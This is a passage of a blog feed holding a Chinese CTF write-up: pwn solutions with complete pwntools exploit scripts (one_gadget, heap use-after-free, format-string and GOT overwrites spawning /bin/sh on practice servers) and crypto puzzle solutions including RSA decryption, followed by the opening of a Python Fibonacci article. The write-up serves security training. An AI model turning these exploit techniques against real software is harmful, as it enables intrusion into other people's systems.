== <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0xe2386</span> execve(<span class="string">"/bin/sh"</span>, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == <span class="literal">NULL</span> || rsi == <span class="literal">NULL</span></span><br><span class="line">  [rdx] == <span class="literal">NULL</span> || rdx == <span class="literal">NULL</span></span><br><span class="line"></span><br><span class="line"><span class="number">0x106ef8</span> execve(<span class="string">"/bin/sh"</span>, rsp+<span class="number">0x70</span>, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+<span class="number">0x70</span>] == <span class="literal">NULL</span></span><br></pre></td></tr></table></figure><p><strong>这里似乎只有第四个能用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26393</span>)</span><br><span class="line"><span class="comment">#c = process('./one_gadget')</span></span><br><span class="line">elf = ELF(<span class="string">'./one_gadget'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.29.so'</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'here is the gift for u:'</span>)</span><br><span class="line"></span><br><span class="line">libcbase = int(c.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) - libc.symbols[<span class="string">'printf'</span>]</span><br><span class="line">success(<span class="string">'libcbase = '</span> + hex(libcbase))</span><br><span class="line">oneGadget = libcbase + <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">c.sendline(str(oneGadget))</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="ydsneedgirlfriend2"><a href="#ydsneedgirlfriend2" class="headerlink" title="ydsneedgirlfriend2"></a>ydsneedgirlfriend2</h2><p>真·入门级堆题，感谢出题人不杀之恩。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>题目提供4个功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>add a girlfriend</span><br><span class="line"><span class="number">2.</span>dele a girlfriend</span><br><span class="line"><span class="number">3.</span>show a girlfriend</span><br><span class="line"><span class="number">4.</span><span class="built_in">exit</span></span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322185754.png" alt></p><p>其中<code>add</code>里面，只会在第一次add的时候在<code>girlfriends[0]</code>申请0x10大小的堆块。</p><p>在<code>*girlfriends[0]</code>存放的是最新一次add时，申请的name的chunk。</p><p>在<code>*girlfriends[1]</code>存放的是<code>print_girlfriend_name</code>的函数指针。</p><p><code>delete函数</code>存在<code>UAF</code>漏洞，free掉但未置为NULL。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322190314.png" alt></p><p>而且出题人太贴心了，给了<code>backdoor</code>函数</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322190225.png" alt></p><p>思路较为简单，借助<code>Fastbin</code>的<code>FILO</code>特性，结合<code>delete</code>函数中的free顺序可得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'b'</span>*<span class="number">8</span> + p64(backdoor))<span class="comment">#change print_girlfriend_name -&gt; backdoor</span></span><br><span class="line">show(<span class="number">0</span>)<span class="comment"># do backdoor</span></span><br></pre></td></tr></table></figure><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">26074</span>)</span><br><span class="line"><span class="comment">#c = process('./ydsneedgirlfriend2')</span></span><br><span class="line">elf = ELF(<span class="string">'./ydsneedgirlfriend2'</span>)</span><br><span class="line">girlfriends = <span class="number">0x6020A0</span></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length,name)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'u choice :\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Please input the length of her name:\n'</span>)</span><br><span class="line">    c.sendline(str(length))</span><br><span class="line">    c.recvuntil(<span class="string">'Please tell me her name:\n'</span>)</span><br><span class="line">    c.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'u choice :\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'2'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'u choice :\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Index :'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaaaaaa'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'bbbbbbbb'</span>+p64(backdoor))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="r2t4"><a href="#r2t4" class="headerlink" title="r2t4"></a>r2t4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x3ff000</span>)</span></span></span><br></pre></td></tr></table></figure><p>main函数有明显的格式化字符串漏洞和栈溢出，但只溢出了8个字节，只够覆盖掉rbp</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323222653.png" alt></p><p>存在backdoor函数，调用<code>system(&#39;cat flag&#39;)</code></p><p>看了半天没想起来怎么做，canary过不掉。。。赛后看了wp以后…</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/3930e380f3d08436.jpg" alt></p><p>既然canary过不掉，那就直接故意触发吧，修改<code>__stack_chk_fail_got</code>为<code>backdoor</code>即可。。。。</p><p>这里我之前写的<code>fmtstr_payload64</code>生成的payload的长度为0x40，超出read的size了，很无奈，只能按short类型来手动写了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">27717</span>)</span><br><span class="line"><span class="comment">#c = process('./r2t4')</span></span><br><span class="line">elf = ELF(<span class="string">'./r2t4'</span>)</span><br><span class="line">__stack_chk_fail=elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">success(<span class="string">'__stack_chk_fail.got = '</span> + hex(__stack_chk_fail))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400626</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%64c%9$hn%1510c%10$hnaaa'</span></span><br><span class="line">payload += p64(__stack_chk_fail+<span class="number">2</span>)</span><br><span class="line">payload += p64(__stack_chk_fail)</span><br><span class="line"></span><br><span class="line">success(<span class="string">'payload.length = '</span> + hex(len(payload)))</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret"><a href="#secret" class="headerlink" title="secret"></a>secret</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x3ff000</span>)</span></span></span><br></pre></td></tr></table></figure><p>挺蛋疼的一道题目</p><p>让你猜秘密,实际上就是猜数字，虽然这些数字在IDA中都能通过正则表达式匹配出来。。。但是一共1万个！！</p><p>有的老哥真匹配出来然后send了一万次….被BUU封IP了….</p><p>官方WP里的做法就比较巧妙</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324023154.png" alt>name实际大小为0x10，但却read了0x16个字节</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324023212.png" alt></p><p>而name与times_ptr紧邻，多出的6个字节可以用来覆盖times_ptr</p><p><strong>注意这里是times_ptr,这是个指针，指向真实的times</strong></p><p>程序初始times = 10000，每猜对一次，<code>times -= 1</code>。</p><p>程序给出了system函数，而且当猜错以后会调用<code>printf(name);</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200324014712.png" alt></p><p><strong>起初想着能不能利用这个格式化字符串漏洞,但是仔细想了想,似乎不太可行。</strong></p><p><strong>但是我们可以通过修改printf_got为system，令name以/bin/sh;开头，触发system(‘/bin/sh’)</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; got</span><br><span class="line"></span><br><span class="line">GOT protection: Partial RELRO | GOT <span class="built_in">functions</span>: 11</span><br><span class="line"> </span><br><span class="line">[0x46d018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7e64cc0 (puts) ◂— push   r14</span><br><span class="line">[0x46d020] write@GLIBC_2.2.5 -&gt; 0x7ffff7eee010 (write) ◂— lea    rax, [rip + 0xdd3b9]</span><br><span class="line">[0x46d028] strlen@GLIBC_2.2.5 -&gt; 0x7ffff7f67090 ◂— mov    ecx, edi</span><br><span class="line">[0x46d030] __stack_chk_fail@GLIBC_2.4 -&gt; 0x401066 (__stack_chk_fail@plt+6) ◂— push   3</span><br><span class="line">[0x46d038] system@GLIBC_2.2.5 -&gt; 0x401076 (system@plt+6) ◂— push   4</span><br><span class="line">[0x46d040] <span class="built_in">printf</span>@GLIBC_2.2.5 -&gt; 0x401086 (<span class="built_in">printf</span>@plt+6) ◂— push   5</span><br><span class="line">[0x46d048] <span class="built_in">read</span>@GLIBC_2.2.5 -&gt; 0x7ffff7eedf70 (<span class="built_in">read</span>) ◂— lea    rax, [rip + 0xdd459]</span><br><span class="line">[0x46d050] setvbuf@GLIBC_2.2.5 -&gt; 0x7ffff7e653d0 (setvbuf) ◂— push   r13</span><br><span class="line">[0x46d058] atoi@GLIBC_2.2.5 -&gt; 0x4010b6 (atoi@plt+6) ◂— push   8</span><br><span class="line">[0x46d060] sprintf@GLIBC_2.2.5 -&gt; 0x4010c6 (sprintf@plt+6) ◂— push   9 /* <span class="string">'h\t'</span> */</span><br><span class="line">[0x46d068] <span class="built_in">exit</span>@GLIBC_2.2.5 -&gt; 0x4010d6 (<span class="built_in">exit</span>@plt+6) ◂— push   0xa /* <span class="string">'h\n'</span> */</span><br></pre></td></tr></table></figure><p>可以看到<code>printf@plt + 6 = 0x401086</code> , <code>system@plt + 6 = 0x401076</code>只相差0x10。</p><p>加之每猜对一次，times -= 1，我们可以通过溢出覆盖<code>times_ptr</code>为<code>0x46d040</code>，然后答对一定的次数，让printf_got变为system_plt，然后故意答错，触发<code>printf(name)</code>即触发<code>system(&#39;/bin/sh&#39;)</code></p><p><strong>这里有一点需要注意</strong>：官方WP给的是答对0x10次，让printf_got变成0x401076也就是<code>system@plt + 6</code>，但是亲测打不通，调试以后发现其他一切正常，但是调用system的时候报段错误…这里我试了一下，答对0x14或者0x15次，也就是让printf_got变成<code>system@plt+2</code>或者<code>system@plt+1</code>才可。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ASDGASDFFEWAVXZC.jpg" alt></p><p>附上EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"><span class="comment">#c = process('./secret')</span></span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">29217</span>)</span><br><span class="line">elf = ELF(<span class="string">'./secret'</span>)</span><br><span class="line">L = [<span class="number">0x476B</span>,<span class="number">0x2D38</span>,<span class="number">0x4540</span>,<span class="number">0x3E77</span>,<span class="number">0x3162</span>,<span class="number">0x3f7d</span>,<span class="number">0x357a</span>,<span class="number">0x3cf5</span>,</span><br><span class="line">     <span class="number">0x2f9e</span>,<span class="number">0x41ea</span>,<span class="number">0x48d8</span>,<span class="number">0x2763</span>,<span class="number">0x474c</span>,<span class="number">0x3809</span>,<span class="number">0x2e63</span>,<span class="number">0x2f4a</span>,</span><br><span class="line">     <span class="number">0x3298</span>,<span class="number">0x28f3</span>,<span class="number">0x3d1b</span>,<span class="number">0x449e</span>,<span class="number">0x3328</span>]</span><br><span class="line">success(hex(elf.got[<span class="string">'printf'</span>]))</span><br><span class="line">c.recvuntil(<span class="string">'What\'s your name?'</span>)</span><br><span class="line">c.sendline(<span class="string">'/bin/sh;AAAAAAAA'</span>+p32(elf.got[<span class="string">'printf'</span>]))<span class="comment">#use p32()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> L:</span><br><span class="line">    c.recvuntil(<span class="string">'Secret:'</span>)</span><br><span class="line">    c.sendline(str(i))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c, 'b * 0x40133a')</span></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">'Secret:'</span>)</span><br><span class="line">c.sendline(<span class="string">'66666'</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到-y1ng"><a href="#签到-y1ng" class="headerlink" title="签到-y1ng"></a>签到-y1ng</h2><p>base64,decode一下就好了。</p><h2 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h2><p>脑洞够大。</p><p><code>罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</code></p><p>这句话的谐音就是<code>BJD大括号这就是福莱格(flag)直接交了吧大括号</code></p><p>所以flag为<code>BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</code></p><h2 id="燕言燕语-y1ng"><a href="#燕言燕语-y1ng" class="headerlink" title="燕言燕语-y1ng"></a>燕言燕语-y1ng</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:</span><br><span class="line">79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</span><br></pre></td></tr></table></figure><p>给了一串HEX，转ASCII以后是<code>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</code></p><p>猜测是<code>维吉尼亚密码</code>，密钥是<code>yanzi</code>，成功解密</p><p>flag为<code>BJD{yanzi_jiushige_shabi}</code></p><h2 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h2><p>小猫很可爱。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200322234152.png" alt></p><p>从上往下，每一行代表一个二进制数，吃饭团的表示0，吃鸡腿的表示1</p><p>bin转ascii得到flag。</p><p><code>BJD{M!a0~}</code></p><h2 id="灵能精通-y1ng"><a href="#灵能精通-y1ng" class="headerlink" title="灵能精通-y1ng"></a>灵能精通-y1ng</h2><p>这题有点水，赛后看WP才知道这个密码是圣堂武士密码，通过查题目的题干能知道这是星际争霸里面的一个角色的一个技能台词？？！！</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323224751.png" alt></p><h2 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h2><p>给了一个txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.</span><br><span class="line">Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot&apos;d z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf&apos;o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. &apos;Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,&apos; Pzffw ozqh,&apos;os tsn wse azt czw usf lw hqttkf!&apos; Tsn q nqbb vqjk wse npzd wse nztd.</span><br><span class="line">MIH&#123;cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw&#125;</span><br></pre></td></tr></table></figure><p>下面有类似于flag的东西，但开头不是<code>BJD</code>而是<code>MIH</code>，盲猜维吉尼亚密码。</p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a>在线解密,指定<code>MIH=BJD</code>,可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our competition. Our competition is mainly for freshmen and sophomores. There are five types of topics in this competition, each of which is very basic. If you are interested in networy security, welcome to participate. Let me tell you a story. I was having dinner at a restaurant when Harry Steele came in, he is a Japanese from Japan but now he is not living in Japan, maybe Harry isn&apos;t a Japanese name but he is really a Japanese. Harry woryed in a lawyer&apos;s office years ago, but he is now worying at a bany. He gets a good salary, but he always borrows money from his friends and never pays it bacy. Harry saw me and came andsatat the same table. He has never borrowed money from me. While he was eating, I asyed him to lend me &amp;2. To my surprise, he gave me the money immediately. &apos;I have never borrrowed any money from you,&apos; Harry said,&apos;so now you can pay for my dinner!&apos; Now i will give you what you want. BJD&#123;pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4cy&#125;</span><br></pre></td></tr></table></figure><p>但是提交一直不成功，修改<code>Cr4cy</code>为<code>Cr4zy</code>也不成功，去群里看了看公告，发现有地方需要改。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200323005432.png" alt></p><p>读了读上面那段话，发现那段话里面该是k的地方全变成了y，所以修改<code>Cr4cy</code>为<code>Cr4ck</code>。</p><p><code>BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</code></p><h2 id="rsa0"><a href="#rsa0" class="headerlink" title="rsa0"></a>rsa0</h2><p>nc连接以后有如下回显，<strong>好像因为靶机不同，具体的回显也不同</strong></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="number">15549851</span></span><br><span class="line"></span><br><span class="line">p+q=<span class="number">20863578032664632805803247009000344892321432818463015557495155759957380706376484569788486497652311136327651058215395343509008398250545579129166602948550344</span></span><br><span class="line"></span><br><span class="line">p-q=<span class="number">-3836010044914889517982485973339196492824587499988100701447424038126206797371420912301320412708697078766834687669285168738335604543547774164235502781085390</span></span><br><span class="line"></span><br><span class="line">c=<span class="number">4782030868853667565973405123820473791306349016814206730867994644057366366041543210479132972104172048240423839135782546226203699218766360325105809914202058277363302078844368666294196255268662132894564282205856907640709197985497727498750715398166130536191311534456423579523525954133760668637482507379670206959</span></span><br><span class="line"></span><br><span class="line">flag=??????</span><br></pre></td></tr></table></figure><p>….直接解出来p和q 然后…直接做就行…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p =gmpy2.mpz(<span class="number">8513783993874871643910380517830574199748422659237457428023865860915586954502531828743583042471807028780408185273055087385336396853498902482465550083732477</span>)</span><br><span class="line">q =gmpy2.mpz(<span class="number">12349794038789761161892866491169770692573010159225558129471289899041793751873952741044903455180504107547242872942340256123672001397046676646701052864817867</span>)</span><br><span class="line">e =gmpy2.mpz(<span class="number">15549851</span>)</span><br><span class="line"></span><br><span class="line">phi_n= (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, phi_n)</span><br><span class="line"></span><br><span class="line">c=gmpy2.mpz(<span class="number">4782030868853667565973405123820473791306349016814206730867994644057366366041543210479132972104172048240423839135782546226203699218766360325105809914202058277363302078844368666294196255268662132894564282205856907640709197985497727498750715398166130536191311534456423579523525954133760668637482507379670206959</span>)</span><br><span class="line"></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'m = '</span> + str(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(m)[<span class="number">2</span>:].replace(<span class="string">'L'</span>,<span class="string">''</span>).decode(<span class="string">'hex'</span>)</span><br></pre></td></tr></table></figure><h2 id="rsa1"><a href="#rsa1" class="headerlink" title="rsa1"></a>rsa1</h2><p><strong>同样是靶机不同，回显不同</strong></p><p>和rsa0一样，不过这个要根据完全平方公式推出来p和q、尝试过得出来pq（也就是n）以后直接分解n，但是分解难度太大，所以还是根据完全平方公式推p和q吧。</p><p>有一处是需要对<code>(p+q)^2</code>进行开放，普通的<code>math.sqrt()</code>方法因为这个数太大了而会报错，这里需要用<code>gmpy2.iroot(gg,2),gg代表(p+q)^2</code>，很幸运，正好开平方，<strong>也就是得到的结果进行平方以后正好等于(p+q)^2</strong></p><p>得到pqec以后脚本和rsa0就一样了。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/70858371_p0.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://liul14n.top/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>[Python]生成斐波那契数列的几种方式的对比与分析</title>
    <link href="http://liul14n.top/2020/03/20/Python-%E7%94%9F%E6%88%90%E6%96%90%E6%B3%A2%E9%82%A3%E5%A5%91%E6%95%B0%E5%88%97%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F%E7%9A%84%E5%AF%B9%E6%AF%94%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <id>http://liul14n.top/2020/03/20/Python-生成斐波那契数列的几种方式的对比与分析/</id>
    <published>2020-03-20T12:54:06.000Z</published>
    <updated>2020-12-22T08:50:15.201Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/902690.jpg" alt></p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写这篇文章为了记录<code>yield的用法</code>、<code>iterable对象相关知识</code>、<code>generator function</code> 、以及一些<code>python的小细节</code></p><p>测试环境:<code>python2.7.16</code></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>斐波那契（Fibonacci）数列：除第一个和第二个数外，任意一个数都可由前两个数相加得到。</strong></p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fab</span><span class="params">(max)</span>:</span> </span><br><span class="line">    n, a, b = <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span> </span><br><span 